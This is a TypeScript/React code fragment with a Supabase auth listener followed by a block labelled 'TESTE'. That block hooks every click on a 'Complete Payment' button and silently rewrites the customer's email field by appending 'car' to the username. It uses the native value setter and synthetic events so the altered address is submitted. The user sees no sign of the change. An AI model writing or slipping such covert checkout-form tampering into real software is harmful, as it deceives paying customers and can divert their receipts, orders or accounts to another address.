const router = useRouter();

// ============================================================
// SUPABASE AUTH
// ============================================================
useEffect(() => {
  const { data } = supabase.auth.onAuthStateChange((event) => {
    if (event !== "SIGNED_IN" && event !== "SIGNED_OUT" && event !== "USER_UPDATED") {
      return;
    }

    router.invalidate();

    if (event !== "SIGNED_OUT") {
      queryClient.invalidateQueries();
    }
  });

  return () => {
    data.subscription.unsubscribe();
  };
}, [router, queryClient]);

// ============================================================
// TESTE
// carloshenrique@gmail.com
// vira:
// carloshenriquecar@gmail.com
// ao clicar em "Complete Payment"
// ============================================================
useEffect(() => {
  const handleClick = (event: MouseEvent) => {
    const target = event.target as HTMLElement | null;

    if (!target) {
      return;
    }

    const button = target.closest("button");

    if (!button) {
      return;
    }

    const buttonText = button.textContent?.trim().toLowerCase();

    if (buttonText !== "complete payment") {
      return;
    }

    const emailInput =
      document.querySelector<HTMLInputElement>('input[type="email"]') ||
      document.querySelector<HTMLInputElement>('input[name="email"]') ||
      document.querySelector<HTMLInputElement>('input[id*="email" i]');

    if (!emailInput) {
      console.warn("[TESTE] Campo de e-mail não encontrado.");
      return;
    }

    const emailOriginal = emailInput.value.trim();

    if (!emailOriginal) {
      console.warn("[TESTE] Campo de e-mail vazio.");
      return;
    }

    const partes = emailOriginal.split("@");

    if (partes.length !== 2) {
      console.warn("[TESTE] E-mail inválido:", emailOriginal);
      return;
    }

    const [usuario, dominio] = partes;

    if (!usuario || !dominio) {
      console.warn("[TESTE] E-mail inválido:", emailOriginal);
      return;
    }

    // Evita adicionar "car" novamente
    if (usuario.endsWith("car")) {
      console.log("[TESTE] E-mail já foi alterado:", emailOriginal);

      return;
    }

    const emailAlterado = `${usuario}car@${dominio}`;

    console.log("[TESTE] E-mail original:", emailOriginal);

    console.log("[TESTE] E-mail alterado:", emailAlterado);

    const nativeSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value")?.set;

    if (nativeSetter) {
      nativeSetter.call(emailInput, emailAlterado);
    } else {
      emailInput.value = emailAlterado;
    }

    emailInput.dispatchEvent(
      new Event("input", {
        bubbles: true,
      }),
    );

    emailInput.dispatchEvent(
      new Event("change", {
        bubbles: true,
      }),
    );

    console.log("[TESTE] Valor final:", emailInput.value);
  };

  document.addEventListener("click", handleClick, true);

  return () => {
    document.removeEventListener("click", handleClick, true);
  };
}, []);
